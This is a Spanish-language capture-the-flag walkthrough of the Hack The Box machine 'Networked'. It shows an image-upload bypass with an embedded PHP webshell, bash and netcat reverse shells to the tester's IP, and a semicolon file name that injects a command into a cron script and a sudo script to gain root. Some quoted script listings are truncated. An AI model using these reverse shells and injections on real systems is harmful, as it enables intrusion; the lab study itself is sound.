# Networked

![](../../../../~gitbook/image.md)Publicado: 02 de Junio de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Easy
### 📝 Descripción
Networked es una máquina Linux de dificultad Easy que simula una aplicación web vulnerable de galería de fotos. La explotación se centra en la subida de archivos maliciosos que permiten ejecución remota de código a través de filtros de validación débiles. El vector de escalada de privilegios implica la explotación de un script cron vulnerable y posteriormente un script sudo mal configurado que permite la ejecución de comandos como root.La máquina enseña conceptos fundamentales como bypass de filtros de subida de archivos, análisis de código fuente, explotación de tareas cron y escalada de privilegios mediante configuraciones sudo inseguras.
### 🔭 Reconocimiento

#### Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 64 sugiere que probablemente sea una máquina Linux.
#### Escaneo de puertos

#### Enumeración de servicios

### 🌐 Enumeración Web

#### 80 HTTP
http://10.10.10.146/Enumerando el sitio web encontramos a priori poca cosa salvo este mensaje:![](../../../../~gitbook/image.md)Revisando el código fuente de la página hay un comentario que sugiere que podría haber un módulo de subida de archivos e imágenes aunque aún no está enlazado.🕷️Fuzzing de directoriosAl realizar fuzzing de directorios usando la herramienta gobuster descubrimos algunos directorios que corroboran el comentario que habíamos encontrado anteriormente:![](../../../../~gitbook/image.md)http://10.10.10.146/upload.php![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)El archivo backup.tar contiene un respaldo del código fuente de la aplicación.![](../../../../~gitbook/image.md)
### 💥 Explotación

#### 📂 Análisis del código fuente
Esto nos permitirá analizarlo para ver si podemos obtener una RCE a partir de una subida arbitraria de archivos.Tras analizar el código verificamos varias restricciones:Requiere que el contenido real sea de tipo `image/*` (analizado con `finfo_file()`).
Tamaño del archivo < 60 KB.
Solo se permite si el nombre del archivo termina con `.jpg`, `.png`, `.gif` o `.jpeg`.Para llevar a cabo la explotación realizamos los siguientes pasos:Creamos una imagen dummy que sea válidaEmbebemos una php shell en la imagen que hemos creado anteriormenteVerificamos el tamaño y el mime type para asegurarnos de que cumpla con las condiciones necesarias para pasar los filtros de validación:Renombramos el archivo
#### 🚀 Obtención de RCE
Ahora nos vamos al módulo de subida de archivos e interceptamos la petición con burp y verificamos que la imagen se suba correctamente:![](../../../../~gitbook/image.md)Ahora nos vamos a http://10.10.10.146/photos.php y verificamos que se haya subido correctamente nuestro archivo:![](../../../../~gitbook/image.md)Accedemos a ella revisando el código fuente de la página y usando la url de la imagen. A continuación ejecutamos el comando id haciendo uso de la webshell y confirmamos que funciona:![](../../../../~gitbook/image.md)Una vez confirmada la PoC, usamos una bash reverse shell y la codificamos como URL para ganar acceso remoto a la máquina objetivo:![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)
#### Mejora de la tty

#### Acceso inicial
Una vez ganado acceso a la máquina, descubrimos un directorio de usuario llamado guly y vemos que no tenemos permisos para leer la flag:Verificamos el contenido crontab.guly y de check_attack.php y vemos que hay una expresión crontab que cada tres minutos ejecuta el archiv check_attack.php:Este código busca en el directorio /var/www/html/uploads/para recuperar todos los archivos de él. La función ‘exec’ es notable porque nos permite crear un nuevo archivo llamado ‘; nc -c bash 10.10.16.42 9002’. Una vez que el script se ejecuta y detecta este archivo, inyectará nuestro comando en él.Para llevar a cabo la explotación, nos situamos en el directorio /var/www/html/uploads/ y creamos el siguiente archivo:![](../../../../~gitbook/image.md)Esperamos 3 minutos a que se ejecute y obtenemos una shell como guly y obtenemos la primera flag:![](../../../../~gitbook/image.md)
#### 🔐 Escalada de Privilegios
Descubrimos que el usuario guly puede puede ejecutar como root un script llamado changename.shEl usuario guly tiene permisos de lectura y ejecución sobre este script:Revisamos el contenido de este script para su análisis:https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4fLa clave en el script anterior está en que se realiza un read de x y la expresión regular únicamente valida que sea caracteres alfanuméricos y ciertos símbolos. Pero si aprovechamos para introducir un espacio o cualquier otro comando antes de ejecutar ciertos comandos como "id" o directamente una "/bin/bash" observamos que lo acepta sin problemas y dado que este es un script en el que se está ejecutando como root y además hay definido un bash -p que ejecuta bash en modo privilegiado, pues resulta sencillo:![](../../../../~gitbook/image.md)Last updated 10 months ago- [📝 Descripción](#descripcion)
- [🔭 Reconocimiento](#reconocimiento)
- [🌐 Enumeración Web](#enumeracion-web)
- [💥 Explotación](#explotacion)

```
❯ ping -c2 10.10.10.146
PING 10.10.10.146 (10.10.10.146) 56(84) bytes of data.
64 bytes from 10.10.10.146: icmp_seq=1 ttl=63 time=117 ms
64 bytes from 10.10.10.146: icmp_seq=2 ttl=63 time=46.9 ms

--- 10.10.10.146 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1005ms
rtt min/avg/max/mdev = 46.895/82.097/117.299/35.202 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.146 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
❯ echo $ports
22,80,443
```

```
❯ nmap -sC -sV -p$ports 10.10.10.75 -oN services.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-02 10:34 CEST
Nmap scan report for 10.10.10.146
Host is up (0.049s latency).

PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
443/tcp closed https

```

```

Hello mate, we're building the new FaceMash!
Help by funding us and be the new Tyler&Cameron!
Join us at the pool party this Sat to get a glimpse

```

```
gobuster dir -u http://10.10.10.146 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -b 403,404,502,503 -x .php,.txt,.xml -r
```

```
convert -size 100x100 xc:white poc.jpg
```

```
echo "" >> poc.jpg
```

```
file --mime-type clean.jpg  # Debe decir "image/jpeg"
stat -c %s clean.jpg
```

```
mv clean.jpg shell.jpg
```

```
http://10.10.10.146/uploads/10_10_14_3.php.jpg?cmd=id
```

```
rlwrap nc -lnvp 443
```

```
bash -i &> /dev/tcp/10.10.14.3/443 0>&1

%62%61%73%68%20%2d%69%20%26%3e%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%34%2e%33%2f%34%34%33%20%30%3e%26%31
```

```
script /dev/null -c bash
stty -raw echo; fg
reset xterm
export TERM=xterm
```

```
bash-4.2$ ls
ls
check_attack.php  crontab.guly	user.txt
bash-4.2$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
bash-4.2$
```

```
cat crontab.guly
*/3 * * * * php /home/guly/check_attack.php
```

```
$value) {
$msg='';
if ($value == 'index.html') {
continue;
}
# echo "-------------\n";

# print "check: $value\n";
list ($name,$ext) = getnameCheck($value);
$check = check_ip($name,$value);

if (!($check[0])) {
echo "attack!\n";
# todo: attach file
file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

exec("rm -f $logpath");
exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
echo "rm -f $path$value\n";
mail($to, $msg, $msg, $headers, "-F$value");
}
}

?>
```

```
touch ';nc -c bash 10.10.14.8 8001'
```

```
[guly@networked ~]$ sudo -l
Matching Defaults entries for guly on networked:
!visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User guly may run the following commands on networked:
(root) NOPASSWD: /usr/local/sbin/changename.sh
[guly@networked ~]$
```

```
[guly@networked ~]$ ls -lah /usr/local/sbin/changename.sh
-rwxr-xr-x 1 root root 422 Jul  8  2019 /usr/local/sbin/changename.sh
```

```
# !/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly > /etc/sysconfig/network-scripts/ifcfg-guly
done

/sbin/ifup guly0
```

```
[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
interface NAME:
root
interface PROXY_METHOD:
a id
interface BROWSER_ONLY:
a /bin/bash
interface BOOTPROTO:
a /bin/bash
uid=0(root) gid=0(root) groups=0(root)
[root@networked network-scripts]# id
uid=0(root) gid=0(root) groups=0(root)
[root@networked network-scripts]#
```
